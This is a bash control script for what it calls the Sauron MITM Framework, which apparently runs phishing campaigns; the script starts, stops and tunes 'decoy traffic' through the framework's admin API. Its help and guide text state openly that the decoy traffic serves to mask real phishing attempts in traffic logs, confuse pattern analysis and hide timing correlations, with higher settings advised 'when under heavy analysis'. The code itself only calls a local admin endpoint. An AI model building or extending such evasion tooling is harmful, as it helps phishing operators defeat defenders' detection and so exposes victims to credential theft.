#!/bin/bash

# Decoy Traffic Control Script for Sauron MITM Framework
# Usage: ./decoy_control.sh [action] [intensity]

set -e

# Configuration
ADMIN_KEY="${ADMIN_KEY:-$(grep 'ADMIN_KEY=' .env 2>/dev/null | cut -d'=' -f2)}"
SERVER_URL="${SERVER_URL:-https://localhost}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Validate admin key
if [[ -z "$ADMIN_KEY" ]]; then
    echo -e "${RED}❌ Error: ADMIN_KEY not found${NC}"
    echo "Set ADMIN_KEY environment variable or add to .env file"
    exit 1
fi

# Function to call decoy control API
decoy_control() {
    local action="$1"
    local intensity="${2:-0.5}"
    
    echo -e "${BLUE}🎭 Decoy traffic control: $action${NC}"
    
    curl -s -X POST "$SERVER_URL/admin/decoy" \
        -H "Content-Type: application/json" \
        -d "{
            \"admin_key\": \"$ADMIN_KEY\",
            \"action\": \"$action\",
            \"intensity\": $intensity
        }" | jq '.'
}

# Function to get decoy status
decoy_status() {
    echo -e "${BLUE}📊 Getting decoy traffic status...${NC}"
    
    curl -s -X GET "$SERVER_URL/admin/decoy/status" \
        -H "X-Admin-Key: $ADMIN_KEY" | jq '.'
}

# Function to show usage
show_usage() {
    echo -e "${GREEN}Decoy Traffic Control for Sauron MITM Framework${NC}"
    echo ""
    echo "Usage: $0 [action] [intensity]"
    echo ""
    echo "Actions:"
    echo "  start [intensity] - Start decoy traffic generation"
    echo "  stop              - Stop decoy traffic generation"
    echo "  status            - Show current decoy traffic status"
    echo "  intensity [value] - Change traffic intensity (0.0-1.0)"
    echo ""
    echo "Intensity Levels:"
    echo "  0.1 - Very Low    (Minimal background noise)"
    echo "  0.3 - Low         (Light traffic)"
    echo "  0.5 - Medium      (Balanced traffic - default)"
    echo "  0.7 - High        (Heavy traffic)"
    echo "  1.0 - Maximum     (Very heavy traffic)"
    echo ""
    echo "Examples:"
    echo "  $0 start 0.3      # Start with low intensity"
    echo "  $0 intensity 0.8  # Increase to high intensity"
    echo "  $0 status         # Check current status"
    echo "  $0 stop           # Stop all decoy traffic"
    echo ""
    echo -e "${YELLOW}🎯 Purpose: Generate realistic background traffic to confuse analysis${NC}"
    echo -e "${PURPLE}🛡️  Security: Helps mask real phishing attempts in traffic logs${NC}"
}

# Function to show intensity guide
show_intensity_guide() {
    echo -e "${GREEN}🎛️  Decoy Traffic Intensity Guide${NC}"
    echo ""
    echo -e "${BLUE}Low Intensity (0.1-0.3):${NC}"
    echo "  • Minimal resource usage"
    echo "  • Subtle background noise"
    echo "  • Good for small operations"
    echo ""
    echo -e "${YELLOW}Medium Intensity (0.4-0.6):${NC}"
    echo "  • Balanced traffic generation"
    echo "  • Moderate resource usage"
    echo "  • Recommended for most campaigns"
    echo ""
    echo -e "${RED}High Intensity (0.7-1.0):${NC}"
    echo "  • Heavy traffic generation"
    echo "  • Higher resource usage"
    echo "  • Use when under heavy analysis"
    echo ""
    echo -e "${PURPLE}🔍 Analysis Confusion:${NC}"
    echo "  • Mixes real phishing with decoy requests"
    echo "  • Makes traffic pattern analysis difficult"
    echo "  • Hides timing correlations"
}

# Main logic
case "${1:-help}" in
    "start")
        intensity="${2:-0.5}"
        echo -e "${GREEN}🚀 Starting decoy traffic generation...${NC}"
        decoy_control "start" "$intensity"
        ;;
    "stop")
        echo -e "${RED}🛑 Stopping decoy traffic generation...${NC}"
        decoy_control "stop"
        ;;
    "status")
        decoy_status
        ;;
    "intensity")
        if [[ -z "$2" ]]; then
            echo -e "${RED}❌ Error: Intensity value required (0.0-1.0)${NC}"
            exit 1
        fi
        intensity="$2"
        echo -e "${YELLOW}🎛️  Adjusting decoy traffic intensity...${NC}"
        decoy_control "intensity" "$intensity"
        ;;
    "guide")
        show_intensity_guide
        ;;
    "help"|"-h"|"--help"|*)
        show_usage
        ;;
esac
